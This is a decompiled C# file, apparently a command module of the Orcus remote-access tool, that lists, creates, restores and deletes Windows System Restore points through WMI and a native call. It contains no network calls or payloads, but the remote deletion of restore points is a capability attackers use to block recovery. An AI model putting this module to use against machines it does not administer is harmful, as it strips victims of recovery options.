using System;
using System.Collections.Generic;
using System.Management;
using Orcus.Native;
using Orcus.Shared.Commands.SystemRestore;

namespace Orcus.Commands.SystemRestore;

public static class SystemRestoreUtilities
{
	public static List<SystemRestorePointInfo> GetSystemRestorePoints()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bf: Expected O, but got Unknown
		List<SystemRestorePointInfo> list = new List<SystemRestorePointInfo>();
		ManagementClass val = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions());
		try
		{
			ManagementObjectCollection instances = val.GetInstances();
			try
			{
				ManagementObjectEnumerator enumerator = instances.GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementObject val2 = (ManagementObject)enumerator.get_Current();
						SystemRestorePointInfo val3 = new SystemRestorePointInfo();
						val3.set_Description((string)((ManagementBaseObject)val2).get_Item("Description"));
						val3.set_CreationDate(ManagementDateTimeConverter.ToDateTime((string)((ManagementBaseObject)val2).get_Item("CreationTime")));
						val3.set_RestorePointType((RestoreType)(uint)((ManagementBaseObject)val2).get_Item("RestorePointType"));
						val3.set_SequenceNumber((uint)((ManagementBaseObject)val2).get_Item("SequenceNumber"));
						val3.set_EventType((EventType)(uint)((ManagementBaseObject)val2).get_Item("EventType"));
						list.Add(val3);
					}
					return list;
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)instances)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	public static bool CreateRestorePoint(string description, RestoreType restoreType, EventType eventType)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected O, but got Unknown
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Expected I4, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Expected I4, but got Unknown
		ManagementClass val = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions());
		try
		{
			ManagementBaseObject methodParameters = ((ManagementObject)val).GetMethodParameters("CreateRestorePoint");
			methodParameters.set_Item("Description", (object)description);
			methodParameters.set_Item("RestorePointType", (object)(uint)(int)restoreType);
			methodParameters.set_Item("EventType", (object)(uint)(int)eventType);
			ManagementBaseObject val2 = ((ManagementObject)val).InvokeMethod("CreateRestorePoint", methodParameters, (InvokeMethodOptions)null);
			return val2 != null && (uint)val2.get_Item("ReturnValue") == 0;
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	public static bool Restore(uint sequenceNumber)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected O, but got Unknown
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		ManagementClass val = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions());
		try
		{
			ManagementBaseObject methodParameters = ((ManagementObject)val).GetMethodParameters("Restore");
			methodParameters.set_Item("SequenceNumber", (object)sequenceNumber);
			ManagementBaseObject val2 = ((ManagementObject)val).InvokeMethod("Restore", methodParameters, (InvokeMethodOptions)null);
			return val2 != null && (uint)val2.get_Item("ReturnValue") == 0;
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	public static bool RemoveRestorePoint(uint sequenceNumber)
	{
		return NativeMethods.SRRemoveRestorePoint(sequenceNumber) == 0;
	}
}
